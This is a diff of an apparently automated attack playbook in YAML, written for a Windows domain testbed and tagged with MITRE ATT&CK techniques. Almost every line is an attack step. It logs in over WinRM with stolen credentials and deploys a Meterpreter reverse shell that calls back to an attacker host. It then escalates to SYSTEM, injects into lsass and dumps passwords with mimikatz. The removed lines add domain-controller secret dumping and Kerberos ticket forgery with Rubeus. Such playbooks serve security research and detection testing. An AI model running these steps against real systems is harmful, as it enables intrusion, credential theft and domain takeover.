@@ -1,22 +1,33 @@
 vars:
-  TARGET: 10.0.0.20
-  ATTACKER: 10.0.0.200
-  USER: Alice
   DOMAIN: aecid-testbed.com
-  PASSWORD: Pa$$w0rd
-  PAYLOADS: /home/aecid/payloads
-  PAYLOAD: "windows/x64/meterpreter/reverse_tcp"
-  DOMADM: "wsadmin"
-  DOMADMPW: "Root.PW1"
-  DOMDC: 10.0.0.10
-  DOMHOST: dc1.aecid-testbed.com
+  COMPROMISED_USER_USERNAME: Alice
+  COMPROMISED_USER_PASSWORD: Pa$$w0rd
+  COMPROMISED_ADMIN_USERNAME: "wsadmin"
+  COMPROMISED_ADMIN_PASSWORD: "Root.PW1"
+  IP_KALI: 10.10.10.200
+  IP_WEB: 10.10.10.10
+  IP_DC1: 10.0.0.10
+  PAYLOADS_DIR: /home/superuser/payloads
+  MSF_PAYLOAD: windows/x64/meterpreter/reverse_tcp
 
 commands:
   - type: shell
-    cmd: "evil-winrm -i $TARGET -u $USER -p '$PASSWORD'\n"
+    cmd: "evil-winrm -i $IP_WEB -u $COMPROMISED_USER_USERNAME -p '$COMPROMISED_USER_PASSWORD'\n"
     command_timeout: 30
     interactive: true
     creates_session: winrm
+    metadata:
+      techniques: "T1021.006,T1047"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: Windows Remote Management"
+
+  - type: msf-payload
+    cmd: $MSF_PAYLOAD
+    payload_options:
+        LHOST: $IP_KALI
+        LPORT: "9001"
+    format: exe
+    local_path: $PAYLOADS_DIR/msf.exe
 
   - type: shell
     session: winrm
@@ -25,187 +36,76 @@ commands:
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS/Rubeus.exe C:\\\\Temp\\\\Rubeus.exe\n"
-    interactive: true
-
-  - type: shell
-    session: winrm
-    cmd: "upload $PAYLOADS/mimidrv.sys C:\\\\Temp\\\\mimidrv.sys\n"
-    interactive: true
-
-  - type: shell
-    session: winrm
-    cmd: "upload $PAYLOADS/mimikatz.exe C:\\\\Temp\\\\mimikatz.exe\n"
-    interactive: true
-
-  - type: shell
-    session: winrm
-    cmd: "upload $PAYLOADS/mimilib.dll C:\\\\Temp\\\\mimilib.dll\n"
-    interactive: true
-
-  - type: shell
-    session: winrm
-    cmd: "upload $PAYLOADS/mimispool.dll C:\\\\Temp\\\\mimispool.dll\n"
-    interactive: true
-
-  - type: shell
-    session: winrm
-    cmd: "Set-Content -Path C:\\\\ProgramData\\\\WriteLog.ps1 -Value 'net localgroup administrators Alice /add'\n"
-    interactive: true
-
-  - type: shell
-    session: winrm
-    cmd: "schtasks /run /tn WriteLog\n"
-    interactive: true
-
-  - type: msf-payload
-    cmd: $PAYLOAD
-    payload_options:
-        LHOST: $ATTACKER
-        LPORT: "9001"
-    format: exe
-    local_path: $PAYLOADS/msf.exe
-
-  - type: shell
-    session: winrm
-    cmd: "upload $PAYLOADS/msf.exe C:\\\\Temp\\\\msf.exe\n"
+    cmd: "upload $PAYLOADS_DIR/msf.exe C:\\\\Temp\\\\msf.exe\n"
     interactive: true
 
   - type: msf-module
-    creates_session: rshell
+    creates_session: msfshell
     cmd: exploit/multi/handler
-    payload: $PAYLOAD
+    payload: $MSF_PAYLOAD
     payload_options:
-      LHOST: $ATTACKER
+      LHOST: $IP_KALI
       LPORT: "9001"
     background: true
     kill_on_exit: true
 
   - type: shell
-    creates_session: winrmPriv
-    command_timeout: 30
-    cmd: "evil-winrm -i $TARGET -u $USER -p '$PASSWORD'\n"
-    interactive: true
-
-  - type: shell
-    session: winrmPriv
+    session: winrm
     cmd: "C:\\\\Temp\\\\msf.exe\n"
     interactive: true
 
   - type: msf-session
-    session: rshell
+    session: msfshell
     cmd: getuid
 
   - type: msf-session
-    session: rshell
+    session: msfshell
+    cmd: pgrep lsass
+
+  - type: setvar
+    cmd: $RESULT_STDOUT
+    variable: $LSASS_PID
+
+  - type: msf-session
+    session: msfshell
     cmd: getsystem
 
   - type: msf-session
-    session: rshell
+    session: msfshell
     cmd: getuid
 
   - type: msf-session
-    session: rshell
-    cmd: load kiwi
+    session: msfshell
+    cmd: migrate $LSASS_PID
+    metadata:
+      techniques: "T1055"
+      tactics: "Defense Evasion, Privilege Escalation"
+      technique_name: "Process Injection"
 
   - type: sleep
-    seconds: 5
-
-  # - type: msf-session
-  #   session: rshell
-  #   cmd: "cd C:\\\\Temp\n"
+    seconds: 10
 
   - type: msf-session
-    session: rshell
-    cmd: "kiwi_cmd \"!+\""
+    session: msfshell
+    cmd: getpid
 
   - type: msf-session
-    session: rshell
+    session: msfshell
+    cmd: load kiwi
+
+  - type: msf-session
+    session: msfshell
     cmd: "kiwi_cmd \"privilege::debug\""
 
   - type: msf-session
-    session: rshell
-    cmd: "kiwi_cmd '\"!processprotect /process:lsass.exe /remove\"'"
-
-  - type: sleep
-    seconds: 2
-
-  - type: msf-session
-    session: rshell
+    session: msfshell
     cmd: "kiwi_cmd \"sekurlsa::logonpasswords\""
+    metadata:
+      techniques: "T1003.001"
+      tactics: "Credential Access"
+      technique_name: "OS Credential Dumping: LSASS Memory"
 
   - type: regex
     cmd: ".*NTLM.*:(.*)"
     output:
       NTLM: "$MATCH_0"
-
-  - type: debug
-    cmd: "$NTLM"
-
-  - type: shell
-    cmd: "secretsdump.py $DOMAIN/'$DOMADM':'$DOMADMPW'@'$DOMDC' -just-dc"
-
-  - type: regex
-    cmd: "krbtgt:aes256.*:(.*)"
-    output:
-      KRBTGT: "$MATCH_0"
-
-  - type: debug
-    cmd: "$KRBTGT"
-
-  - type: msf-session
-    session: rshell
-    cmd: "ps"
-
-  - type: regex
-    cmd: ".*explorer*."
-    output:
-      PID: "$MATCH_0"
-
-  - type: regex
-    cmd: "(\\d+) "
-    input: PID
-    output:
-      EXPORTPID: "$MATCH_0"
-
-  - type: debug
-    cmd: "$EXPORTPID"
-
-  - type: msf-session
-    session: rshell
-    cmd: "migrate $EXPORTPID"
-
-  - type: msf-session
-    session: rshell
-    cmd: getuid
-
-  - type: msf-session
-    session: rshell
-    cmd: "execute -f C:\\\\Temp\\\\Rubeus.exe -a \"diamond /krbkey:$KRBTGT /user:$USER /password:$PASSWORD /enctype:aes /domain:$DOMAIN /dc:$DOMHOST /ticketuser:$USER /ptt /nowrap\" -i"
-
-  # - type: setvar
-  #   variable: RUB
-  #   cmd: $RESULT_STDOUT
-
-  # - type: sleep
-  #   seconds: 2
-
-  - type: regex
-    cmd: "      (\\S+)"
-  #  input: RUB
-    output:
-      RUBHASH: "$MATCH_3"
-
-  - type: debug
-    cmd: "$RUBHASH"
-
-  - type: msf-session
-    session: rshell
-    cmd: "execute -f C:\\\\Temp\\\\Rubeus.exe -a \"asktgs /ticket:$RUBHASH /service:cifs/$DOMHOST /ptt /nowrap \" -i "
-
-  - type: sleep
-    seconds: 2
-
-  - type: msf-session
-    session: rshell
-    cmd: "kerberos_ticket_list"
